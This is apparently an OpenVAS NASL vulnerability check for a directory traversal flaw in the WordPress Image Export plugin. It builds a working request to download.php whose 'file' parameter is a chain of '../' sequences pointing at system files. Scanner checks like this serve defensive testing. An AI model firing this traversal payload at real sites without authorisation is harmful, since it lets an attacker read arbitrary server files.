###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_image_export_dir_trav_vuln.nasl 5626 2017-03-20 15:16:30Z cfi $
#
# Wordpress Image Export Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807625");
  script_version("$Revision: 5626 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:16:30 +0100 (Mon, 20 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:31 +0530 (Fri, 01 Apr 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress Image Export Directory Traversal Vulnerability");

  script_tag(name:"summary" , value:"This host is installed with Wordpress Image
  Export plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not");

  script_tag(name:"insight", value:"The flaw exist due to an improper sanitization
  of input to 'file' parameter in 'download.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to read arbitrary files.

  Impact Level: System/Application");

  script_tag(name:"affected" , value:"Wordpress Image Export Plugin 1.1.0. and prior");

  script_tag(name:"solution", value:"No solution or patch is available as of
  09th February, 2017. Information regarding this issue will be reported once the updates
  are available. For updates refer to https://wordpress.org/plugins/image-export/");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39584/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

# Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get installed location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
   ## Construct vulnerable url 
   url = dir + '/wp-content/plugins/image-export-master/download.php?file=' + crap(data: "../", length: 3*15) + files[file];

   ## Try attack and check the response to confirm vulnerability
   if( http_vuln_check( port:http_port, url:url, check_header:TRUE, pattern:file ) )
   {
     report = report_vuln_url(port:http_port, url:url);
     security_message(port:http_port, data:report);
     exit(0);
   }
}
